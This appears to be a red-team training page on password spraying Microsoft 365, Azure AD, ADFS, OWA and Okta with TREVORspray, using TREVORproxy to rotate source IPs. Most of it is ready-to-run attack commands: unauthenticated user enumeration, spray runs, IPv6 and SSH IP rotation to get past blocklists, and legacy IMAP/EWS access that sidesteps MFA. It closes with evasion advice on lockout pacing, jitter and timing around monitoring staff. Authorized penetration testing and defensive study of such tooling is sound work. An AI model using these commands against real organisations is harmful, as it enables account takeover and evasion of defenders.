---
layout: training-page
title: "TREVORspray & TREVORproxy — Password Spraying with IP Rotation — Red Team Academy"
module: "Reconnaissance"
tags:
  - trevorspray
  - trevorproxy
  - password-spraying
  - o365
  - azure-ad
  - mfa-bypass
  - ip-rotation
  - credential-attacks
  - recon
page_key: "recon-trevorspray"
render_with_liquid: false
---

# TREVORspray & TREVORproxy — Password Spraying with IP Rotation

TREVORspray is a modular, feature-rich password sprayer purpose-built for Microsoft targets (O365, Azure AD, ADFS, OWA) and other services (Okta, Cisco AnyConnect). It includes automatic username enumeration, MFA bypass loot collection, lockout detection, and resume support. TREVORproxy pairs with it to rotate source IPs across either a full IPv6 /64 subnet (18 quintillion unique IPs via Linux AnyIP) or a pool of SSH tunnels — making spray campaigns far harder to block by IP reputation alone.

## Install

```
# Python 3.8+ required
pip install trevorspray trevorproxy

# Or from source:
git clone https://github.com/blacklanternsecurity/TREVORspray
cd TREVORspray && pip install -e .

git clone https://github.com/blacklanternsecurity/TREVORproxy
cd TREVORproxy && pip install -e .
```

## TREVORproxy — IP Rotation

TREVORproxy is a SOCKS5 proxy that routes outbound requests through rotating source IPs. Two modes are available: subnet mode uses Linux AnyIP to bind outbound connections to random addresses within a routed IPv6 /64 block, and SSH mode round-robins traffic through multiple SSH tunnels.

### Subnet Mode (IPv6 AnyIP)

```
# Requirements:
# - A routed IPv6 /64 (or larger) block assigned to your server
#   (common with VPS providers — e.g., Hetzner, OVH, Vultr)
# - Linux kernel with AnyIP support (enabled by default)

# How it works:
# Linux AnyIP lets a host accept any IP in a subnet as local.
# TREVORproxy adds the /64 route and then binds outbound SOCKS connections
# to random source IPs within the block — each request appears from a
# different IP to the target, bypassing per-IP block lists.

# Start the SOCKS5 proxy on port 1080:
trevorproxy subnet -s dead:beef::0/64 -i eth0

# Flags:
# -s  subnet    IPv6 subnet to rotate through (needs to be routed to your host)
# -i  iface     Network interface to add the route to (e.g., eth0, ens3)
# -p  port      Proxy listen port (default 1080)

# Verify it's working — each curl should show a different source IP:
curl --socks5 127.0.0.1:1080 https://ifconfig.me
curl --socks5 127.0.0.1:1080 https://ifconfig.me
```

### SSH Mode (Round-Robin Tunnels)

```
# Requirements:
# - SSH access to 2+ VPS servers with different IP addresses
# - Each server is used as an outbound proxy via SSH dynamic port forwarding

# How it works:
# TREVORproxy opens SSH SOCKS5 tunnels to each host and round-robins
# outbound connections across them. With 5 SSH hosts, every 5th request
# comes from a different server IP.

# Start proxy with 3 SSH hosts:
trevorproxy ssh root@1.2.3.4 root@4.3.2.1 root@5.6.7.8

# Optional — custom SSH key:
trevorproxy ssh root@1.2.3.4 root@4.3.2.1 --key ~/.ssh/spray_key

# Use iptables to transparently redirect outbound traffic through the proxy:
# (TREVORspray handles this automatically when --proxy is specified)

# Verify rotation:
for i in 1 2 3 4 5; do
  curl --socks5 127.0.0.1:1080 https://ifconfig.me
  echo ""
done
# Should show 3 alternating source IPs
```

## TREVORspray — Modules

TREVORspray modules target specific authentication endpoints. Each module knows the URL, request format, success/failure indicators, and MFA handling for its platform.

```
# Available modules:
# msol        — Microsoft Online (login.microsoftonline.com) — O365 / Azure AD
# adfs        — ADFS (Active Directory Federation Services) on-premise
# owa         — Outlook Web App / Exchange on-premise
# okta        — Okta identity platform
# anyconnect  — Cisco AnyConnect VPN

# List all modules:
trevorspray --list-modules

# Module-specific options:
trevorspray spray --module msol --help
```

## Step 1 — Domain Recon (Enumerate Valid Users)

Before spraying, use TREVORspray's recon mode to enumerate valid user accounts without triggering lockouts. It queries the OneDrive user enumeration endpoint and Azure AD Seamless SSO — both return existence data without authentication attempts or lockout risk.

```
# Enumerate all users at a domain — no lockout risk:
trevorspray --recon corp.com

# Output:
# Discovered email format: {first}.{last}@corp.com
# Found OneDrive users: john.smith, jane.doe, admin, svc_backup
# Found SSO users: alice.jones, bob.chen

# Save results to file:
trevorspray --recon corp.com -o valid_users.txt

# If you have a username list and want to verify which exist:
trevorspray --recon corp.com -u potential_users.txt

# Sources used by --recon:
# 1. OneDrive: https://onedrive.live.com/odc/v2.1/federationprovider?domain=corp.com&user=test
#    Returns 200 if user exists, 404 if not
# 2. Azure Seamless SSO: usernamemixed endpoint
#    Returns IfExistsResult field in JSON
# Both are unauthenticated and do not increment lockout counters
```

## Step 2 — Password Spraying

```
# Basic spray against O365 with a single password:
trevorspray -u valid_users.txt -p 'Welcome123!' --module msol

# Multiple passwords (one per line — sprays each user with each password, spacing out attempts):
trevorspray -u valid_users.txt -p passwords.txt --module msol

# Spray against ADFS (on-premise ADFS endpoint):
trevorspray -u valid_users.txt -p 'Summer2024!' --module adfs \
  --url https://adfs.corp.com/adfs/ls/idpinitiatedsignon.aspx

# Spray against OWA:
trevorspray -u valid_users.txt -p 'Welcome2024' --module owa \
  --url https://mail.corp.com/owa/

# Spray against Okta:
trevorspray -u valid_users.txt -p 'Password1' --module okta \
  --url https://corp.okta.com

# Key flags:
# -u  users     Username list file (or single email)
# -p  password  Password or file of passwords
# --module      Authentication module to use (msol/adfs/owa/okta/anyconnect)
# --url         Custom target URL (required for adfs/owa/anyconnect)
# --delay       Seconds between spray rounds (default: auto-calculated from lockout policy)
# --lockout-delay  Additional delay if lockout threshold approached
# --jitter      Randomize delay ±N seconds to appear more human
```

## Step 3 — Spray with IP Rotation

```
# Spray using TREVORproxy subnet mode (requires routed IPv6 /64):
# Start TREVORproxy in one terminal:
trevorproxy subnet -s dead:beef::0/64 -i eth0

# In another terminal, point TREVORspray at the proxy:
trevorspray -u valid_users.txt -p 'Welcome123!' --module msol \
  --proxy socks5://127.0.0.1:1080

# Spray through SSH pool (3 exit nodes):
trevorproxy ssh root@1.2.3.4 root@4.3.2.1 root@5.6.7.8 &
trevorspray -u valid_users.txt -p 'Welcome123!' --module msol \
  --proxy socks5://127.0.0.1:1080

# All-in-one: TREVORspray can invoke TREVORproxy internally via --ssh:
trevorspray -u valid_users.txt -p 'Welcome123!' --module msol \
  --ssh root@1.2.3.4 root@4.3.2.1 root@5.6.7.8
```

## MFA Bypass — Loot Collection

When credentials are valid but MFA is enforced, TREVORspray captures the partial authentication token from the response. In some O365 configurations these tokens can be replayed to access services that don't enforce MFA — such as legacy protocols (IMAP, POP3, SMTP, EWS, ActiveSync) or older Azure applications.

```
# TREVORspray automatically collects and logs MFA bypass tokens:
# - Tokens saved to: ~/.trevorspray/loot/
# - Check output for lines marked [MFA] — these are valid-but-MFA-protected accounts

# After spray completes, check loot:
ls ~/.trevorspray/loot/
cat ~/.trevorspray/loot/tokens.txt

# Test legacy auth (bypasses MFA in many tenants):
# IMAP with valid credentials:
curl -v imaps://outlook.office365.com \
  --user john.smith@corp.com:Welcome123! \
  --request LIST "" "*"

# EWS (Exchange Web Services) — no MFA enforcement in many tenants:
curl -s -u john.smith@corp.com:Welcome123! \
  -H "Content-Type: text/xml; charset=utf-8" \
  -H "SOAPAction: \"http://schemas.microsoft.com/exchange/services/2006/messages/GetFolder\"" \
  https://outlook.office365.com/EWS/Exchange.asmx \
  -d '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
  <soap:Body>
    <m:GetFolder>
      <m:FolderShape><t:BaseShape>Default</t:BaseShape></m:FolderShape>
      <m:FolderIds><t:DistinguishedFolderId Id="inbox"/></m:FolderIds>
    </m:GetFolder>
  </soap:Body>
</soap:Envelope>'

# Check if tenant allows legacy auth (requires Azure AD / MSOnline PowerShell module):
# Install-Module MSOnline -Force; Connect-MsolService
# Get-MsolCompanyInformation | Select-Object DefaultUsageLocation, UsersPermissionToCreateGroupsEnabled
```

## Operational Notes

```
# Lockout policy discovery (before spraying):
# Microsoft default: 10 failed attempts → 1-minute lockout (smart lockout)
# Threshold is per-user, not per-IP
# TREVORspray auto-detects lockout indicators and backs off

# Safe spray cadence for O365 (default smart lockout):
# - 1 password per user per 30 minutes is conservative
# - trevorspray --delay 1800 for single-password campaigns

# Spray timing:
# - Monday morning = highest success rate (password resets after weekend)
# - Avoid Friday afternoon (monitoring teams active at week-end)

# Logging and resume:
# All progress saved automatically to ~/.trevorspray/
# Resume interrupted spray: trevorspray --resume 
# View previous sprays: trevorspray --list-sessions

# Opsec:
# - Rotate proxies if spray covers >50 users per IP per day
# - Rotate passwords, not users — O365 smart lockout tracks per-user failures
# - If using subnet mode, verify IPv6 routing before spraying:
#   curl -6 --socks5 127.0.0.1:1080 https://ifconfig.me
```

## Resources

- TREVORspray — `github.com/blacklanternsecurity/TREVORspray`
- TREVORproxy — `github.com/blacklanternsecurity/TREVORproxy`
- Related: [Ghost Scout — AI-Assisted Spear Phishing Pretext](/recon/ghost-scout/)
- Related: [Active Directory Password Attacks](/active-directory/password-spraying/)
- Related: [Phishing Campaign Methodology](/reporting/phishing-campaign/)
